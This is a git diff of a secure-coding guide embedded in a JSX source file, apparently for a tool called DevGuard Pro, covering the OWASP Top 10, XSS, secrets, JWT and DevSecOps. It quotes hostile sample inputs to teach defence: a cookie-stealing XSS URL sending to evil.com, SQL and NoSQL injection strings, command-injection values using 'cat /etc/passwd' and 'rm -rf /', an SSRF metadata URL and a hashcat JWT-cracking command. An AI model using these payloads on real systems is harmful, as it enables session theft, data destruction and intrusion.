@@ -103,309 +103,231 @@ Every Firestore query is filtered by \`userId\`, ensuring **complete data isolat
   },
   {
     id: 'ch-owasp',
-    title: 'OWASP Top 10 — Complete Guide',
+    title: 'OWASP Top 10 — Complete Encyclopedia',
     icon: <AlertTriangle size={16} />,
-    description: 'Every OWASP Top 10 category — what it means, how to detect it, and exactly how to fix it.',
+    description: 'The definitive deep-dive into the OWASP Top 10 — from conceptual architecture flaws to low-level memory safety issues.',
     sections: [
       {
-        subtitle: '2.1 A01 — Broken Access Control',
-        content: `**OWASP Ranking: #1** — Found in 94% of tested applications.
+        subtitle: '2.1 A01:2021 — Broken Access Control',
+        content: `**OWASP Global Ranking: #1** — Found in 94% of tested applications.
 
-## What Is It?
+### What Is It?
+Broken Access Control is the inability of an application to enforce policies such that users cannot act outside their intended permissions. It is functionally the most common and damaging security flaw in modern web apps.
 
-Broken Access Control means users can perform actions or access data **beyond their intended permissions**. It's the umbrella category for all authorization failures.
+### Common Attack Patterns
+- **IDOR (Insecure Direct Object Reference)**: Modifying a \`userId\` or \`docId\` in a URL or API request to see another user's private data.
+- **Privilege Escalation**: A regular user accessing \`/admin\` or \`/api/set-admin\` endpoints.
+- **CORS Misconfiguration**: Allowing cross-origin requests from malicious domains via \`Access-Control-Allow-Origin: *\`.
 
-## Common Attack Patterns
-
-- **IDOR (Insecure Direct Object Reference)** — Accessing \`/api/users/1234\` and changing \`1234\` to access another user's data
-- **Horizontal Privilege Escalation** — User A accessing User B's resources at the same permission level
-- **Vertical Privilege Escalation** — Regular user accessing admin-only endpoints
-- **Client-Side Access Control** — Hiding admin buttons via CSS instead of enforcing server-side
-- **Force Browsing** — Accessing \`/admin\`, \`/config.php\`, \`/backup/\` directly
-
-## The Vulnerable Pattern
-
-```javascript
-// WRONG — checks authentication but NOT authorization
-app.get('/api/document/:id', authMiddleware, async (req, res) => {
-  const doc = await db.documents.findById(req.params.id);
-  res.json(doc); // Returns document to ANY authenticated user
+### The Vulnerable Pattern (Node.js)
+\`\`\`javascript
+// ❌ VULNERABLE — Checks authentication but NOT ownership
+app.get('/api/profile/:id', auth, async (req, res) => {
+  const user = await User.findById(req.params.id);
+  res.json(user); // Any logged-in user can see any other user's profile
 });
-```
-
-## The Correct Fix
-
-```javascript
-// CORRECT — checks authentication AND ownership
-app.get('/api/document/:id', authMiddleware, async (req, res) => {
-  const doc = await db.documents.findById(req.params.id);
-  if (!doc) return res.status(404).json({ error: 'Not found' });
-  if (doc.ownerId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
-  res.json(doc);
-});
-```
-
-## Prevention Rules
-
-- **Default to DENY** — explicitly grant permissions, never implicitly allow
-- **Enforce server-side** on every request, for every endpoint — never client-side
-- **Return 404 (not 403)** for unauthorized resource access to avoid leaking existence
-- Use a centralized authorization library (Casbin, CASL, OPA)
-- Log all access control failures and alert on patterns`
-      },
-      {
-        subtitle: '2.2 A02 — Cryptographic Failures',
-        content: `**OWASP Ranking: #2** — Previously called "Sensitive Data Exposure".
-
-## The Spectrum of Failures
-
-### Level 1 — No Encryption
-- Storing passwords in plaintext
-- Transmitting data over HTTP instead of HTTPS
-- Writing API keys directly into source code
-
-### Level 2 — Weak Encryption (False Security)
-- Using MD5 or SHA1 for password hashing — **not designed for passwords**. A modern GPU can crack millions of MD5 hashes per second.
-- Using AES-ECB mode (leaks patterns in ciphertext)
-- Using static, hardcoded initialization vectors (IVs)
-
-### Level 3 — Implementation Errors
-- Correct algorithm, wrong parameters (e.g., bcrypt with work factor of 2 instead of 12+)
-
-## Correct Password Hashing
-
-Use **Argon2id** (recommended) or **bcrypt** with cost factor ≥ 12.
-
-```javascript
-// Node.js with argon2
-const argon2 = require('argon2');
-
-// Hashing
-const hash = await argon2.hash(password, {
-  type: argon2.argon2id,
-  memoryCost: 2 ** 16, // 64 MB
-  timeCost: 3,
-  parallelism: 1
-});
-
-// Verification
-const isValid = await argon2.verify(hash, plainTextPassword);
-```
-
-```python
-# Python
-import argon2
-ph = argon2.PasswordHasher(time_cost=3, memory_cost=65536)
-hash = ph.hash(password)
-is_valid = ph.verify(hash, password)
-```
-
-## Correct Data Encryption
-
-Use **AES-256-GCM** (provides confidentiality + integrity):
-- Generate a **unique, random IV** for every encryption operation
-- Store encryption keys in a dedicated secrets manager (AWS KMS, HashiCorp Vault)
-- **Never store keys in source code**`
-      },
-      {
-        subtitle: '2.3 A03 — Injection (SQL, NoSQL, OS Command)',
-        content: `**OWASP Ranking: #3** — On the list since OWASP's inception in 2003.
-
-## The Core Principle
-
-Injection occurs when **untrusted data is sent to an interpreter as part of a command or query**. The interpreter cannot distinguish between intended commands and attacker-supplied data.
-
-## SQL Injection — The Classic
-
-```php
-// VULNERABLE — PHP classic
-$username = $_GET['username'];
-$query = "SELECT * FROM users WHERE username = '$username'";
-mysql_query($query);
-// Attack: set username to: ' OR '1'='1
-// Result: returns ALL users
-```
-
-## NoSQL Injection (MongoDB)
-
-```javascript
-// VULNERABLE
-db.users.find({ username: req.body.username, password: req.body.password });
-// Attack: send password as {"$ne": null}
-// Result: bypasses password check entirely
-```
-
-## OS Command Injection
-
-```python
-# VULNERABLE
-import os
-filename = request.args.get('file')
-os.system(f"convert {filename} output.png")
-# Attack: set file to: report.pdf; cat /etc/passwd
-```
-
-## The Fix: Parameterized Queries
-
-```javascript
-// Node.js (mysql2) — SAFE
-const [rows] = await db.execute(
-  'SELECT * FROM users WHERE username = ?', 
-  [req.body.username]
-);
-```
-
-```python
-# Python (psycopg2) — SAFE
-cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
-```
-
-```java
-// Java (JDBC) — SAFE
-PreparedStatement stmt = conn.prepareStatement(
-  "SELECT * FROM users WHERE username = ?"
-);
-stmt.setString(1, username);
-ResultSet rs = stmt.executeQuery();
-```
-
-> **Rule:** Parameterized queries make injection **structurally impossible** — not just hard. Use them everywhere, no exceptions.`
-      },
-      {
-        subtitle: '2.4 A04 through A10 — Remaining OWASP Categories',
-        content: `## A04 — Insecure Design
-
-About conceptual architecture flaws — can't be fixed by perfect implementation.
-
-**Examples of insecure design:**
-- Password reset via security questions (low-entropy, publicly findable answers)
-- Systems that can **show you your existing password** (means it's stored unencrypted)
-- No rate limiting on login attempts
-- Single-factor authentication for wire transfers or account deletion
-
-**Fix:** Run threat modeling before building any feature:
-1. What data does this feature process or expose?
-2. Who should have access?
-3. How could an attacker abuse this?
-4. What's the blast radius if exploited?
-
----
-
-## A05 — Security Misconfiguration
-
-The most common vulnerability class by prevalence.
-
-**Common misconfigurations:**
-- Default admin credentials left unchanged
-- Debug endpoints enabled in production (\`/phpinfo.php\`, \`/actuator/env\`)
-- Verbose error messages exposing stack traces to users
-- S3 buckets set to public read/write
-- Missing security headers
-
-**One-line fix (Node.js):**
-
-```javascript
-const helmet = require('helmet');
-app.use(helmet()); // Adds 10+ security headers automatically
-```
-
----
-
-## A06 — Vulnerable and Outdated Components
-
-Modern apps are 80–90% third-party code. The 2021 Log4Shell vulnerability (CVSSv3: **10.0 — maximum**) affected millions of apps through a single library.
-
-```bash
-# Audit commands
-npm audit                    # List known vulnerabilities
-npm audit fix                # Auto-fix safe updates
-npx snyk test                # More comprehensive scan
-pip audit                    # Python equivalent
-```
-
----
-
-## A07 — Identification & Authentication Failures
-
-**Rate limiting implementation:**
-
-```javascript
-const rateLimit = require('express-rate-limit');
-
-const loginLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 10,                   // 10 attempts per IP
-  message: { error: 'Too many login attempts. Try again in 15 minutes.' }
-});
-
-app.post('/login', loginLimiter, loginHandler);
-```
-
-**Session cookie security:**
-\`\`\`
-Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
 \`\`\`
 
----
+### The DevGuard Pro Identification
+DevGuard identifies this by flagging API routes that take an ID parameter but don't perform an ownership check against the \`req.user.id\` or session object.
 
-## A08 — Software and Data Integrity Failures
-
-**Subresource Integrity (SRI) for CDN scripts:**
-
-```html
-<script 
-  src="https://cdn.example.com/library.min.js"
-  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ..."
-  crossorigin="anonymous">
-</script>
-```
-
----
-
-## A09 — Security Logging & Monitoring Failures
-
-The average attacker dwell time in 2023 was **200+ days**. Log everything security-relevant:
-
-```json
-{
-  "timestamp": "2026-04-19T10:30:00.000Z",
-  "level": "WARN",
-  "event": "auth.login_failed",
-  "ipAddress": "203.0.113.42",
-  "metadata": {
-    "attemptedEmail": "admin@company.com",
-    "reason": "invalid_credentials"
+### The Professional Fix
+\`\`\`javascript
+// ✅ SECURE — Enforces strict ownership
+app.get('/api/profile/:id', auth, async (req, res) => {
+  if (req.params.id !== req.user.id && req.user.role !== 'admin') {
+    return res.status(403).json({ error: 'Access Denied' });
   }
-}
-```
-
-**Never log:** passwords, session tokens, credit cards, SSNs, or any PII beyond what's strictly necessary.
-
----
-
-## A10 — Server-Side Request Forgery (SSRF)
-
-The 2019 Capital One breach exposed 100M records via SSRF against the AWS metadata endpoint.
-
-```javascript
-// VULNERABLE
-app.post('/preview', async (req, res) => {
-  const response = await fetch(req.body.url); // SSRF — attacker can target internal services
-  res.send(await response.text());
+  const user = await User.findById(req.params.id);
+  res.json(user);
 });
+\`\`\`
+`
+      },
+      {
+        subtitle: '2.2 A02:2021 — Cryptographic Failures',
+        content: `**OWASP Global Ranking: #2** — Focuses on failures related to cryptography (formerly known as Sensitive Data Exposure).
 
-// SAFE — allowlist validation
-const ALLOWED_DOMAINS = ['api.github.com', 'api.stripe.com'];
-const { hostname } = new URL(userUrl);
-if (!ALLOWED_DOMAINS.includes(hostname)) {
-  return res.status(400).json({ error: 'Domain not permitted' });
+### Common Failures
+- **Transmission of data in cleartext**: Using HTTP, FTP, or SMTP for sensitive data.
+- **Weak Cryptographic Algorithms**: Using MD5, SHA-1, or DES which are trivially breakable on modern hardware.
+- **Hardcoded Secrets**: Storing API keys or DB passwords in your \`.js\` or \`.py\` files.
+
+### Critical Fix: Password Hashing
+Never use MD5. Use **Argon2id** (winner of the Password Hashing Competition) or **bcrypt** with a cost factor of at least 12.
+
+### Multi-Language Safe Patterns
+
+**Python (using passlib):**
+\`\`\`python
+from passlib.hash import argon2
+hash = argon2.hash("mypassword") # ✅ Secure hashing
+\`\`\`
+
+**Java (using Spring Security):**
+\`\`\`java
+BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
+String result = encoder.encode("mypassword"); // ✅ Secure hashing
+\`\`\`
+
+### How DevGuard Pro Identifies It
+Our heuristic engine scans for:
+1. Regex patterns matching AWS/Azure/Google API keys.
+2. Calls to deprecated crypto functions (e.g., \`crypto.createHash('md5')\`).
+3. Variable names like \`PASSWORD\`, \`SECRET\`, \`TOKEN\` assigned to string literals.`
+      },
+      {
+        subtitle: '2.3 A03:2021 — Injection',
+        content: `**OWASP Global Ranking: #3** — Includes SQL, NoSQL, OS Command, and LDAP injection.
+
+### The "Little Bobby Tables" Scenario
+Injection occurs when user-supplied data is concatenated directly into a query, allowing the attacker to change the query's structure.
+
+### Dangerous Pattern (SQLi)
+\`\`\`sql
+-- ❌ DANGEROUS
+query = "SELECT * FROM users WHERE name = '" + userInput + "'";
+-- Attacker enters: ' OR '1'='1
+-- Result: SELECT * FROM users WHERE name = '' OR '1'='1' (Returns everyone)
+\`\`\`
+
+### The Fix: Parameterized Queries
+Parameterized queries (or Prepared Statements) ensure the database treats input as *data*, never as *executable code*.
+
+**PHP (PDO):**
+\`\`\`php
+$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
+$stmt->execute(['email' => $email]); // ✅ SAFE
+\`\`\`
+
+**Node.js (pg):**
+\`\`\`javascript
+const query = 'SELECT * FROM users WHERE id = $1';
+const values = [userId];
+const res = await client.query(query, values); // ✅ SAFE
+\`\`\`
+
+### OS Command Injection
+Avoid calling shell commands directly with user input. If you must use \`child_process.exec\`, strictly validate input against an allowlist.
+
+\`\`\`javascript
+// ❌ DANGEROUS
+exec(\`convert \${filename} output.png\`);
+// Attacker enters: file.jpg; rm -rf / 
+\`\`\``
+      },
+      {
+        subtitle: '2.4 A04:2021 — Insecure Design',
+        content: `**OWASP Global Ranking: #4** — A new category for 2021 focusing on risks related to design flaws.
+
+### Design vs. Implementation
+A design can be perfectly implemented but still be insecure. For example, a password reset flow that uses security questions like "What is your mother's maiden name?" is an *insecure design* because the answers are often public knowledge.
+
+### Prevention Strategies
+- **Threat Modeling**: Ask "Who could attack this feature and how?" before writing a single line of code.
+- **Secure Design Patterns**: Use battle-tested patterns like "Write-Once-Read-Many" for audit logs.
+- **Principle of Least Privilege**: A microservice that only needs to read logs should not have a "Delete" permission on the database.`
+      },
+      {
+        subtitle: '2.5 A05:2021 — Security Misconfiguration',
+        content: `**OWASP Global Ranking: #5** — 90% of applications have some form of misconfiguration.
+
+### Common Examples
+- **Default Accounts**: Keeping \`admin/admin\` or \`guest/guest\` credentials.
+- **Verbose Error Messages**: Showing stack traces to your users (\`Error at line 45 in db_config.php\`).
+- **Open Cloud Storage**: Leaving S3 buckets public.
+- **HTTP Headers**: Missing \`Content-Security-Policy\` or \`X-Frame-Options\`.
+
+### The Quick Fix (Headers)
+Include the \`Helmet\` middleware in every Express app. It adds 15+ headers that prevent common sniff-and-click attacks.
+
+\`\`\`javascript
+const helmet = require('helmet');
+app.use(helmet()); // ✅ Adds 15+ security headers
+\`\`\``
+      },
+      {
+        subtitle: '2.6 A06:2021 — Vulnerable and Outdated Components',
+        content: `**OWASP Global Ranking: #6** — You are only as secure as your weakest dependency.
+
+### The Dependency Trap
+A modern JavaScript application often has 1,000+ transitive dependencies. If one of them (like \`lodash\` or \`log4j\`) has a vulnerability, your entire app is compromised.
+
+### The DevGuard Pro Prevention
+Our tool scans for \`package.json\` and \`requirements.txt\` content to identify libraries with known CVEs.
+
+**Recommended Workflow:**
+1. Run \`npm audit\` weekly.
+2. Use \`Dependabot\` on GitHub.
+3. Lock your dependency versions with \`package-lock.json\`.`
+      },
+      {
+        subtitle: '2.7 A07:2021 — Identification & Authentication Failures',
+        content: `**OWASP Global Ranking: #7** — Formerly known as "Broken Authentication".
+
+### Key Vulnerabilities
+- **Brute Force**: Allowing 10,000 login attempts without a lockout.
+- **Session Fixation**: Not rotating session IDs after login.
+- **Insecure JWTs**: Using \`alg: none\` or weak signing keys.
+
+### The DevGuard Pro Fix
+We scan for weak JWT configurations and missing logout logic.
+
+**Safe Session Config:**
+\`\`\`javascript
+res.cookie('token', token, {
+  httpOnly: true, // Prevents XSS theft
+  secure: true,   // Only sent over HTTPS
+  sameSite: 'Strict' // Prevents CSRF
+});
+\`\`\``
+      },
+      {
+        subtitle: '2.8 A08:2021 — Software and Data Integrity Failures',
+        content: `**OWASP Global Ranking: #8** — Focuses on making assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity.
+
+### Examples
+- **Insecure Deserialization**: Accepting serialized objects from users and converting them back to code.
+- **CI/CD Poisoning**: Not verifying the integrity of 3rd-party scripts in your build pipeline.
+
+### The Fix: Integrity Attributes
+Always use the \`integrity\` attribute when loading scripts from CDNs.
+
+\`\`\`html
+<script src="https://cdn.com/lib.js" 
+        integrity="sha384-..." 
+        crossorigin="anonymous">
+</script>
+\`\`\``
+      },
+      {
+        subtitle: '2.9 A09:2021 — Security Logging & Monitoring Failures',
+        content: `**OWASP Global Ranking: #9** — The average time to detect a breach is **200+ days**.
+
+### The Failure
+If you don't log a failed login attempt, you'll never know someone is brute-forcing your server until they've already succeeded.
+
+### Best Practices
+- Log all failed authentication attempts.
+- Include the IP, timestamp, and User-Agent.
+- **Never log sensitive data** (no passwords, no SSNs in logs).
+- Use an external monitoring service like Sentry or Datadog.`
+      },
+      {
+        subtitle: '2.10 A10:2021 — Server-Side Request Forgery (SSRF)',
+        content: `**OWASP Global Ranking: #10** — Occurs when a web application is fetching a remote resource without validating the user-supplied URL.
+
+### The Attack
+An attacker provides a URL like \`http://169.254.169.254/latest/meta-data/\` to steal AWS credentials or \`http://localhost:5432\` to scan your internal network.
+
+### The Fix: Domain Allowlisting
+\`\`\`javascript
+const ALLOWED_DOMAINS = ['api.stripe.com', 'api.github.com'];
+const userUrl = new URL(req.body.url);
+if (!ALLOWED_DOMAINS.includes(userUrl.hostname)) {
+  throw new Error('Unauthorized domain');
 }
-```
-
-**Also block these IP ranges:**
-- \`10.0.0.0/8\`, \`172.16.0.0/12\`, \`192.168.0.0/16\` — private IPv4
-- \`169.254.0.0/16\` — cloud metadata services (AWS, GCP, Azure)
-- \`localhost\`, \`127.0.0.0/8\` — loopback`
+\`\`\``
       }
     ]
   },
@@ -433,19 +355,19 @@ Payload is stored in the database (in a comment, profile, review) and executes e
 ### Type 2 — Reflected XSS
 Payload is reflected from the server in the HTTP response. Requires tricking victim into clicking a crafted URL.
 
-```
+\`\`\`
 https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
-```
+\`\`\`
 
 ### Type 3 — DOM-Based XSS
 Vulnerability exists entirely in client-side JavaScript — the payload never reaches the server.
 
-```javascript
+\`\`\`javascript
 // VULNERABLE — DOM XSS
 const params = new URLSearchParams(window.location.search);
 document.getElementById('greeting').innerHTML = 'Hello, ' + params.get('name');
 // URL: ?name=<img src=x onerror=alert(1)>
-```
+\`\`\`
 
 ## Dangerous DOM Sinks
 
@@ -467,15 +389,15 @@ These properties/methods execute any HTML/JS you assign to them:
 
 React encodes automatically in JSX expressions:
 
-```jsx
+\`\`\`jsx
 const userInput = '<script>alert(1)</script>';
 return <div>{userInput}</div>;            // ✅ SAFE — rendered as text
 return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // ❌ DANGEROUS
-```
+\`\`\`
 
 ## Layer 2 — Content Security Policy (CSP)
 
-```
+\`\`\`
 Content-Security-Policy: 
   default-src 'self';
   script-src 'self' 'nonce-{randomNonce}';
@@ -483,11 +405,11 @@ Content-Security-Policy:
   img-src 'self' data: https:;
   object-src 'none';
   frame-ancestors 'none';
-```
+\`\`\`
 
 The **nonce approach** — only scripts with the server-generated nonce execute:
 
-```python
+\`\`\`python
 # Python Flask
 import secrets
 
@@ -500,11 +422,11 @@ def set_csp_header(response):
     nonce = g.get('csp_nonce', '')
     response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
     return response
-```
+\`\`\`
 
 ## Layer 3 — DOMPurify (When innerHTML Is Required)
 
-```javascript
+\`\`\`javascript
 import DOMPurify from 'dompurify';
 
 const config = {
@@ -515,23 +437,23 @@ const config = {
 
 const safeHTML = DOMPurify.sanitize(userContent, config);
 document.getElementById('content').innerHTML = safeHTML;
-```
+\`\`\`
 
 ## Layer 4 — HttpOnly Cookie Flag
 
 Even if XSS occurs, \`HttpOnly\` cookies cannot be read by JavaScript:
 
-```
+\`\`\`
 Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
-```
+\`\`\`
 
 ## Layer 5 — Security Headers
 
-```
+\`\`\`
 X-XSS-Protection: 1; mode=block
 X-Content-Type-Options: nosniff
 X-Frame-Options: DENY
-```
+\`\`\`
 
 > **Defense in depth:** An attacker needs to bypass **all** your layers, but you only need **one** to hold.`
       }
@@ -567,18 +489,18 @@ Once a secret is committed to a public repo:
 
 ## What DevGuard Pro Detects
 
-```javascript
+\`\`\`javascript
 // FLAGGED — hardcoded secrets
 const API_KEY = "AKIAIOSFODNN7EXAMPLE";        // AWS key pattern
 const STRIPE_KEY = "sk_live_abc123...";         // Stripe live key
 const password = "supersecretpassword123";       // Generic password
 const jwt_secret = "my_jwt_secret";             // JWT signing secret
 const mongoUri = "mongodb://user:pass@host";    // Connection string with credentials
-```
+\`\`\`
 
 ## Safe Patterns
 
-```javascript
+\`\`\`javascript
 // SAFE — environment variables
 const API_KEY = process.env.VITE_API_KEY;
 const DB_PASSWORD = process.env.DATABASE_PASSWORD;
@@ -586,11 +508,11 @@ const DB_PASSWORD = process.env.DATABASE_PASSWORD;
 // SAFE — runtime secrets manager (production)
 const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
 const { DB_PASSWORD } = await getSecret('prod/myapp/database');
-```
+\`\`\`
 
 ## .env Best Practices
 
-```bash
+\`\`\`bash
 # .env.example — COMMIT this (no real values)
 DATABASE_URL=          # PostgreSQL connection string
 STRIPE_SECRET_KEY=     # Get from Stripe Dashboard > API Keys
@@ -599,7 +521,7 @@ GEMINI_API_KEY=        # Get from Google AI Studio
 
 # .env — NEVER commit (add to .gitignore before first commit)
 DATABASE_URL=postgresql://user:actualpassword@host:5432/db
-```
+\`\`\`
 
 > **Generate a strong JWT secret:** \`openssl rand -base64 64\``
       },
@@ -611,7 +533,7 @@ DATABASE_URL=postgresql://user:actualpassword@host:5432/db
 
 A JWT has three Base64URL-encoded parts: \`[Header].[Payload].[Signature]\`
 
-```json
+\`\`\`json
 // Header
 { "alg": "HS256", "typ": "JWT" }
 
@@ -623,29 +545,29 @@ A JWT has three Base64URL-encoded parts: \`[Header].[Payload].[Signature]\`
   "iat": 1713500000,
   "exp": 1713503600
 }
-```
+\`\`\`
 
 ## Critical Vulnerabilities
 
 ### 1. The "None" Algorithm Attack
 
-```javascript
+\`\`\`javascript
 // Malicious JWT with alg: "none" — no signature verification needed
 // Fix: Always specify allowed algorithms explicitly
 jwt.verify(token, secret, { algorithms: ['HS256'] }); // Allowlist only HS256
-```
+\`\`\`
 
 ### 2. Weak Secrets
 
 An HS256 secret of \`"secret"\` can be brute-forced offline:
-```bash
+\`\`\`bash
 hashcat -a 0 -m 16500 token.jwt wordlist.txt
-```
+\`\`\`
 
 **Fix:** Use at least 256 bits of cryptographically random data:
-```bash
+\`\`\`bash
 openssl rand -base64 32
-```
+\`\`\`
 
 ### 3. Tokens Stored in localStorage
 
@@ -655,7 +577,7 @@ openssl rand -base64 32
 
 ## Recommended Implementation
 
-```javascript
+\`\`\`javascript
 // Authentication endpoint
 app.post('/login', async (req, res) => {
   // ... validate credentials ...
@@ -682,11 +604,11 @@ app.post('/login', async (req, res) => {
 
   res.json({ accessToken }); // Access token in response body (stored in memory by frontend)
 });
-```
+\`\`\`
 
 ## Token Refresh Flow
 
-```javascript
+\`\`\`javascript
 // Client silently refreshes when access token expires
 app.post('/refresh-token', (req, res) => {
   const token = req.cookies.refreshToken;
@@ -705,8 +627,95 @@ app.post('/refresh-token', (req, res) => {
     res.status(401).json({ error: 'Invalid refresh token — please log in again' });
   }
 });
-```
+\`\`\`
 `
+      }
+    ]
+  },
+  {
+    id: 'ch-api-security',
+    title: 'Modern API Security & OAuth2',
+    icon: <Zap size={16} />,
+    description: 'Securing the backbone of modern apps: REST, GraphQL, OAuth2, and JWT hardening.',
+    sections: [
+      {
+        subtitle: '6.1 REST vs GraphQL — Unique Risks',
+        content: `### GraphQL Specific Risks
+- **Depth Attacks**: Malicious deeply nested queries that crash the server (\`user { post { user { post { ... } } } }\`).
+- **Batching Attacks**: Simulation of multiple requests in a single transaction.
+
+### Prevention
+- Use **Query Depth Limiting**.
+- Use **Complexity Analysis** (assign points to fields).
+- Disable **Introspection** in production.`
+      },
+      {
+        subtitle: '6.2 OAuth2 and OpenID Connect (OIDC)',
+        content: `### The Flow
+1. **Authorization Code Flow** (Recommended for Web Apps).
+2. **PKCE** (Proof Key for Code Exchange) — Mandatory for Mobile and SPA.
+
+### Common Mistakes
+- **Inadequate Redirect URI Validation**: Allowing any domain as the callback.
+- **Weak Client Secret**: Using short, guessable strings.
+- **Implicit Flow**: Don't use it — it's deprecated and insecure.`
+      }
+    ]
+  },
+  {
+    id: 'ch-devsecops',
+    title: 'DevSecOps & Supply Chain',
+    icon: <Cpu size={16} />,
+    description: 'Securing the pipeline from commit to cloud deployment.',
+    sections: [
+      {
+        subtitle: '7.1 CI/CD Pipeline Hardening',
+        content: `### Safe Pipeline Architecture
+1. **Secrets Management**: Never use CI variables for sensitive keys; use a Vault.
+2. **Static Analysis**: Run DevGuard Pro on every PR.
+3. **Container Scanning**: Scan Docker images for OS-level vulnerabilities.
+
+### SBOM (Software Bill of Materials)
+Always generate an SBOM (using \`syft\` or \`cyclonedx\`) to track every library in your final artifact.`
+      },
+      {
+        subtitle: '7.2 Container & Kubernetes Security',
+        content: `### Docker Best Practices
+- **Never run as root**: Use \`USER node\` or equivalent.
+- **Multi-stage builds**: Only copy necessary artifacts to the final image.
+- **Scan images**: Use \`trivy\` to find vulnerabilities in base images.`
+      }
+    ]
+  },
+  {
+    id: 'ch-languages',
+    title: 'Language-Specific Security Deep Dive',
+    icon: <Activity size={16} />,
+    description: 'Specific security pitfalls and patterns for C++, Python, Java, and Go.',
+    sections: [
+      {
+        subtitle: '8.1 C++ Memory Safety',
+        content: `### Use Smart Pointers
+Avoid \`new\` and \`delete\`. Use \`std::unique_ptr\` and \`std::shared_ptr\` to prevent memory leaks and use-after-free bugs.
+
+### Buffer Overflows
+Never use \`gets()\` or \`strcpy()\`. Use \`fgets()\` and \`strncpy()\` with explicit length checks.`
+      },
+      {
+        subtitle: '8.2 Python SecurityPitfalls',
+        content: `### The Dangers of \`pickle\`
+Never deserialize untrusted data with \`pickle\`. It can execute arbitrary code. Use **JSON** instead.
+
+### Template Injection (Jinja2)
+Sanitize all user input before rendering in templates to prevent Server-Side Template Injection (SSTI).`
+      },
+      {
+        subtitle: '8.3 Java Serialization & Logging',
+        content: `### Log4Shell Prevention
+Always keep your logging libraries up to date. Disable JNDI lookups in Log4j if not absolutely necessary.
+
+### Deserialization
+Prefer built-in JSON and Protocol Buffer serialization over native Java serialization.`
       }
     ]
   },
@@ -781,7 +790,7 @@ The cost of fixing a security bug doubles for every stage it passes:
 
 ## Security Headers
 
-```javascript
+\`\`\`javascript
 // Express.js — Helmet adds 10+ headers in one line
 const helmet = require('helmet');
 
@@ -797,13 +806,13 @@ app.use(helmet({
     }
   }
 }));
-```
+\`\`\`
 
 **Verify your headers:** https://securityheaders.com — Target: **A+** score
 
 ## Rate Limiting
 
-```javascript
+\`\`\`javascript
 const rateLimit = require('express-rate-limit');
 
 // Global protection (DDoS)
@@ -817,11 +826,11 @@ const authLimiter = rateLimit({
   message: { error: 'Too many attempts. Wait 15 minutes.' }
 });
 app.use(['/login', '/signup', '/reset-password'], authLimiter);
-```
+\`\`\`
 
 ## Input Validation with Zod
 
-```javascript
+\`\`\`javascript
 import { z } from 'zod';
 
 const CreateUserSchema = z.object({
@@ -841,11 +850,11 @@ app.post('/users', async (req, res) => {
   }
   // Safe to proceed with result.data
 });
-```
+\`\`\`
 
 ## Safe Error Handling
 
-```javascript
+\`\`\`javascript
 // ❌ WRONG — exposes internals
 app.use((err, req, res, next) => {
   res.status(500).json({ error: err.message, stack: err.stack });
@@ -860,11 +869,11 @@ app.use((err, req, res, next) => {
     requestId // User provides this to support for debugging
   });
 });
-```
+\`\`\`
 
 ## CORS Configuration
 
-```javascript
+\`\`\`javascript
 const allowedOrigins = [
   'https://yourproduction.com',
   process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
@@ -878,7 +887,7 @@ app.use(cors({
   credentials: true,
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
 }));
-```
+\`\`\`
 
 ## Pre-Deployment Security Checklist
 
@@ -906,16 +915,16 @@ Before installing a new \`npm\` package, evaluate:
 3. **Maintainer count** — single-maintainer packages are higher risk (account compromise)
 4. **Source inspection** — read the source of security-adjacent packages
 
-```bash
+\`\`\`bash
 # Audit your dependencies regularly
 npm audit                        # Built-in vulnerability scan
 npx snyk test                    # More comprehensive database
 npm ci                           # Use in CI/CD — respects lock file exactly
-```
+\`\`\`
 
 ## Subresource Integrity (SRI) for CDN Assets
 
-```html
+\`\`\`html
 <!-- Without SRI: if CDN is compromised, your users run attacker code -->
 <script src="https://cdn.example.com/library.min.js"></script>
 
@@ -925,7 +934,7 @@ npm ci                           # Use in CI/CD — respects lock file exactly
   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ..."
   crossorigin="anonymous">
 </script>
-```
+\`\`\`
 
 **Generate SRI hash:**
 \`\`\`bash
@@ -934,7 +943,7 @@ openssl dgst -sha384 -binary FILE | openssl base64 -A
 
 ## Safe URL Handling
 
-```javascript
+\`\`\`javascript
 // ❌ VULNERABLE — open redirect
 const redirectUrl = req.query.return_to;
 res.redirect(redirectUrl); // Could redirect to https://evil.com
@@ -945,25 +954,25 @@ const redirectTo = ALLOWED_PATHS.includes(req.query.return_to)
   ? req.query.return_to 
   : '/dashboard';
 res.redirect(redirectTo);
-```
+\`\`\`
 
 ## Clickjacking Prevention
 
-```
+\`\`\`
 X-Frame-Options: DENY
 Content-Security-Policy: frame-ancestors 'none';
-```
+\`\`\`
 
 ## Secure Cookie Settings
 
-```
+\`\`\`
 Set-Cookie: session=abc123; 
   HttpOnly;              /* JS cannot read it */
   Secure;               /* HTTPS only */
   SameSite=Strict;      /* No cross-site requests */
   Path=/;
   Max-Age=3600          /* 1 hour */
-```
+\`\`\`
 `
       },
       {
@@ -972,61 +981,61 @@ Set-Cookie: session=abc123;
 
 ## Pre-Commit Hooks with Husky
 
-```bash
+\`\`\`bash
 npm install --save-dev husky
 npx husky init
-```
+\`\`\`
 
 **.husky/pre-commit:**
-```bash
+\`\`\`bash
 #!/bin/sh
 npm run lint
 npx gitleaks detect --staged   # Detect secrets in staged files
 npm audit --audit-level=high   # Block commits with high/critical CVEs
-```
+\`\`\`
 
 ## Secret Scanning Tools
 
-```bash
+\`\`\`bash
 # TruffleHog — deep repo historical scan
 trufflehog github --repo=https://github.com/yourorg/yourrepo
 
 # Gitleaks — CI/CD friendly
 gitleaks detect --staged       # Pre-commit
 gitleaks detect                # Full repo scan
-```
+\`\`\`
 
 **GitHub Actions integration:**
